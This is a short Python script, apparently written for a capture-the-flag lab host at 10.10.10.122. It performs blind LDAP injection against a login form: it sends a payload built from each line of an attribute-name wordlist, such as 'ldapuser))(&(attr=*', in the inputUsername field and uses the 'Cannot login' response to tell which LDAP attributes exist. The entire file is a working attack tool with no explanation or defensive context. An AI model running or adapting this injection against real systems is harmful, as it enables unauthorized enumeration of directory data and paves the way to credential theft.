import requests as r
import urllib.parse as u

attributes = []

attribute_list = open("/usr/share/wordlists/ldap_attribute_names.txt", "r")

for i in attribute_list:
        
    ldap_injection = "ldapuser))(&(%s=*" % (i[:-1])
    
    data = { "inputUsername": u.quote(ldap_injection) }
    req = r.post("http://10.10.10.122/login.php", data=data)

    if "Cannot login" in req.text:
        print(ldap_injection)
        attributes.append(i[:-1])

attribute_list.close()
print(attributes)